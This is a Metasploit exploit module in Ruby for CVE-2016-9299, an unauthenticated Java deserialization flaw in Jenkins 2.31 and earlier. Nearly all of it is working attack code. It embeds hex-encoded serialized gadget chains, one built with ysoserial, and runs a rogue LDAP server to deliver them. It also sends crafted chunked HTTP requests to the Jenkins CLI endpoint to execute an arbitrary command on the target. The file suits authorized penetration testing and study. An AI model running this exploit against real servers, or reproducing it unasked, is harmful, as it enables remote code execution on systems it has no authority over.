##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  STAGE1 = "aced00057372002b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e466c6174334d6170a300f47ee17184980300007870770400000002737200316f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e7365742e4c6973744f726465726564536574fcd39ef6fa1ced530200014c00087365744f726465727400104c6a6176612f7574696c2f4c6973743b787200436f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e7365742e416273747261637453657269616c697a61626c655365744465636f7261746f72110ff46b96170e1b0300007870737200156e65742e73662e6a736f6e2e4a534f4e41727261795d01546f5c2872d20200025a000e657870616e64456c656d656e74734c0008656c656d656e747371007e0003787200186e65742e73662e6a736f6e2e41627374726163744a534f4ee88a13f4f69b3f82020000787000737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a65787000000001770400000001740008041ac080131d170678787371007e00090000000077040000000078737200116a6176612e6c616e672e426f6f6c65616ecd207280d59cfaee0200015a000576616c75657870017372002a6a6176612e7574696c2e636f6e63757272656e742e436f6e63757272656e74536b69704c697374536574dd985079bdcff15b0200014c00016d74002d4c6a6176612f7574696c2f636f6e63757272656e742f436f6e63757272656e744e6176696761626c654d61703b78707372002a6a6176612e7574696c2e636f6e63757272656e742e436f6e63757272656e74536b69704c6973744d6170884675ae061146a70300014c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b7870707372001f636f6d2e73756e2e6a6e64692e6c6461702e4c646170417474726962757465c47b6b02a60583c00300034c000a62617365437478456e767400154c6a6176612f7574696c2f486173687461626c653b4c000a6261736543747855524c7400124c6a6176612f6c616e672f537472696e673b4c000372646e7400134c6a617661782f6e616d696e672f4e616d653b787200256a617661782e6e616d696e672e6469726563746f72792e42617369634174747269627574655d95d32a668565be0300025a00076f7264657265644c000661747472494471007e001778700074000077040000000078707400156c6461703a2f2f6c6f63616c686f73743a313233347372001a6a617661782e6e616d696e672e436f6d706f736974654e616d6517251a4b93d67afe0300007870770400000000787871007e000e707871007e000e78"
  # java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections6 'touch /tmp/wtf'
  STAGE2 = "aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000e746f756368202f746d702f777466740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878"

  SEARCH_RES_ENTRY = 4

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Jenkins CLI HTTP Java Deserialization Vulnerability',
      'Description'    => %q{
        This module exploits a vulnerability in Jenkins. An unsafe deserialization bug exists on
        the Jenkins, which allows remote arbitrary code execution via HTTP. Authentication is not
        required to exploit this vulnerability.
      },
      'Author'         =>
        [
          'Matthias Kaiser', # Original Vulnerability discovery
          'Alisa Esage', # Private Exploit
          'Ivan', # Metasploit Module Author
          'YSOSerial' #Stage 2 payload
        ],
      'License'        => MSF_LICENSE,
      'Platform'       => ['linux', 'unix'],
      'Arch'           => ARCH_CMD,
      'Targets' => [ [ 'Jenkins 2.31', {} ] ],
      'References'     =>
        [
          ['CVE', '2016-9299'],
          ['URL', 'https://github.com/jenkinsci-cert/SECURITY-218'],
          ['URL', 'https://wiki.jenkins-ci.org/display/SECURITY/Jenkins+Security+Advisory+2016-11-16'],
          ['URL', 'http://www.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class-deepsec-edition'],
          ['URL', 'https://github.com/frohoff/ysoserial']
        ],
      'Payload'        =>
        {
          'Compat'      =>
            {
              'PayloadType' => 'cmd'
            }
        },
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Nov 16 2016'
    ))

    register_options([
      OptString.new('TARGETURI', [true, 'The base path to Jenkins', '/']),
      Opt::RPORT('8080'),
      OptAddress.new('SRVHOST', [ true, "The local host to listen on for the ldap server. This must be an address on the local machine or 0.0.0.0", '127.0.0.1' ]),
      OptPort.new('SRVPORT',    [ true, "The local port to listen on for the ldap server.", 1389 ]),
      OptAddress.new('LDAPHOST', [ true, "The ldap host the exploit will try to connect to ", '127.0.0.1' ])
    ], self.class)
  end

  def target_uri
    begin
      URI(datastore['TARGETURI'])
    rescue ::URI::InvalidURIError
      print_error "Invalid URI: #{datastore['TARGETURI'].inspect}"
      raise Msf::OptionValidateError.new(['TARGETURI'])
    end
  end

  def normalize_uri(*strs)
    new_str = strs * "/"

    new_str = new_str.gsub!("//", "/") while new_str.index("//")

    # Makes sure there's a starting slash
    unless new_str[0,1] == '/'
      new_str = '/' + new_str
    end

    new_str
  end

  def aseq(x, tag)
    s = seq(x)
    s.tag_class = :APPLICATION
    s.tag = tag
    s
  end

  def seq(x)
    OpenSSL::ASN1::Sequence.new(x)
  end

  def int(x)
    OpenSSL::ASN1::Integer.new(x)
  end

  def string(x)
    OpenSSL::ASN1::OctetString.new(x)
  end

  def set(x)
    OpenSSL::ASN1::Set.new(x)
  end

  def java_string(s)
    length = s.length

    packed_length = [length].pack("S>")

    "#{packed_length}#{s}"
  end

  def make_stage2(command)
    [STAGE2].pack("H*").gsub("\x00\x0Etouch /tmp/wtf", java_string(command))
  end


  def make_stage2_reply(command)
    message_id = 3
    java_class_name_attributes = seq([string("javaClassName"), set([string("WTF")])])
    java_serialized_data_attributes = seq([string("javaSerializedData"), set([string(make_stage2(command))])])
    attributes = seq([java_class_name_attributes, java_serialized_data_attributes])
    s = seq([
      int(message_id),
      aseq([string("cn=wtf, dc=example, dc=com"), attributes], SEARCH_RES_ENTRY)])
    s.to_der
  end



  def make_stage1(ldap_url)
    [STAGE1].pack("H*").gsub("\x00\x15ldap://localhost:1234", java_string(ldap_url))
  end


  def read_ldap_packet(socket)

    bytes = socket.read(2)
    if bytes[0] != "0"
      raise "NOT_LDAP: #{bytes.inspect} #{bytes[0]}"
    end

    length = bytes[1].ord
    if (length & (1<<7)) != 0
      length_bytes_length = length ^ (1<<7)

      length_bytes = socket.read(length_bytes_length)
      length = length_bytes.bytes.reduce(0) {|c, e| (c << 8) + e}
    end

    socket.read(length)
  end


  def write_chunk(socket, chunk)
    socket.write(chunk.bytesize.to_s(16) + "\r\n")
    socket.write(chunk)
    socket.write("\r\n")
  end

  def exploit
    uuid = SecureRandom.uuid

    ldap_port = datastore["SRVPORT"]
    ldap_host = datastore["SRVHOST"]
    ldap_external_host = datastore["LDAPHOST"]

    command = payload.encoded
    host = datastore["RHOST"]

    ldap = TCPServer.new(ldap_host, ldap_port)

    cli_path = normalize_uri(target_uri.path, "cli")

    begin

      download = connect()

      begin

        download.write("POST #{cli_path} HTTP/1.1\r\n" +
          "Host: #{host}\r\n" +
          "User-Agent: curl/7.36.0\r\n" +
          "Accept: */*\r\n" +
          "Session: #{uuid}\r\n" +
          "Side: download\r\n" +
          "Content-Length: 0\r\n" +
          "Content-Type: application/x-www-form-urlencoded\r\n\r\n")

        download.read(20)

        upload = connect()
        begin
          upload.write("POST #{cli_path} HTTP/1.1\r\n" +
            "Host: #{host}\r\n" +
            "User-Agent: curl/7.36.0\r\n" +
            "Accept: */*\r\n" +
            "Session: #{uuid}\r\n" +
            "Side: upload\r\n" +
            "Content-type: application/octet-stream\r\n" +
            "Transfer-Encoding: chunked\r\n\r\n")

          write_chunk(upload, "<===[JENKINS REMOTING CAPACITY]===>rO0ABXNyABpodWRzb24ucmVtb3RpbmcuQ2FwYWJpbGl0eQAAAAAAAAABAgABSgAEbWFza3hwAAAAAAAAAP4=")
          write_chunk(upload, "\00\00\00\00")

          upload.flush

          stage1 = make_stage1("ldap://#{ldap_external_host}:#{ldap_port}")

          chunk_header = [stage1.bytesize].pack("S>")
          write_chunk(upload, chunk_header + stage1)

          upload.flush

          client = ldap.accept
          begin
            read_ldap_packet(client)
            client.write(["300c02010161070a010004000400"].pack("H*"))

            read_ldap_packet(client)
            client.write(["3034020102642f04066f753d777466302530230411737562736368656d61537562656e747279310e040c636e3d737562736368656d61"].pack("H*"))
            client.write(["300c02010265070a010004000400"].pack("H*"))

            read_ldap_packet(client)
            client.write(make_stage2_reply(command))
            client.write(["300c02010365070a010004000400"].pack("H*"))

            client.flush
          ensure
            client.close
          end
        ensure
          upload.close
        end
      ensure
        download.close
      end

    ensure
      ldap.close
    end
  end

  def check
    result = Exploit::CheckCode::Safe

    begin
      if vulnerable?
        result = Exploit::CheckCode::Vulnerable
      end
    rescue Msf::Exploit::Failed => e
      vprint_error(e.message)
      return Exploit::CheckCode::Unknown
    end

    result
  end

  def vulnerable?
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path)
    })
    unless res
      fail_with(Failure::Unknown, 'The connection timed out.')
    end

    http_headers = res.headers

    http_headers['X-Jenkins'] && http_headers['X-Jenkins'] <= "2.31"
  end

  # Connects to the server, creates a request, sends the request,
  # reads the response
  #
  # Passes +opts+ through directly to Rex::Proto::Http::Client#request_cgi.
  #
  def send_request_cgi(opts={}, timeout = 20)

    begin
      c = Rex::Proto::Http::Client.new(datastore['RHOST'], datastore['RPORT'])
      c.connect
      r = c.request_cgi(opts)
      c.send_recv(r, timeout)
    rescue ::Errno::EPIPE, ::Timeout::Error
      nil
    end
  end
end
